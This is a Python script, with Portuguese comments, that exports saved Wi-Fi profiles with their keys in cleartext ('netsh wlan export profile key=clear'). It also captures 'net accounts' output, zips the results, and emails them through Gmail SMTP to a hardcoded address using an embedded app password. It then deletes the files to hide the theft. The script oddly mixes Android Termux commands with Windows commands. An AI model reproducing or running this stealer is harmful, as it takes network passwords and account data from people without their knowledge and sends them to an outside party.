import os
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import subprocess

# Comandos para conceder permissões
subprocess.run(['termux-setup-storage'])
subprocess.run(['termux-wifi-scaninfo'])
subprocess.run(['termux-accounts'])

smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'brayanfs08062009@gmail.com'
smtp_password = 'ctsd dxdj mbmu twil'

destinatario = 'brayanfs08062008@gmail.com'

mensagem = MIMEMultipart()
mensagem['Subject'] = 'Informações de WiFi e conta de usuário'
mensagem['From'] = smtp_username
mensagem['To'] = destinatario

subprocess.Popen('netsh wlan export profile key=clear', shell=True)

import time

time.sleep(5)

arquivos_xml = [
    arquivo for arquivo in os.listdir('.') if arquivo.endswith('.xml')
]

arquivo_zip = 'dados_wifi_conta.zip'

with zipfile.ZipFile(arquivo_zip, 'w') as zipf:
  for arquivo in arquivos_xml:
    zipf.write(arquivo)

subprocess.Popen('net accounts > accounts.txt', shell=True)

time.sleep(5)

with open('accounts.txt', 'rb') as file:
  part = MIMEBase('application', 'octet-stream')
  part.set_payload(file.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename=accounts.txt')
mensagem.attach(part)

with open(arquivo_zip, 'rb') as file:
  part = MIMEBase('application', 'octet-stream')
  part.set_payload(file.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f'attachment; filename= {arquivo_zip}')
mensagem.attach(part)

server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(smtp_username, smtp_password)

server.sendmail(smtp_username, destinatario, mensagem.as_string())

server.quit()

for arquivo in arquivos_xml + [arquivo_zip, 'accounts.txt']:
  os.remove(arquivo)

print('E-mail enviado com sucesso!')
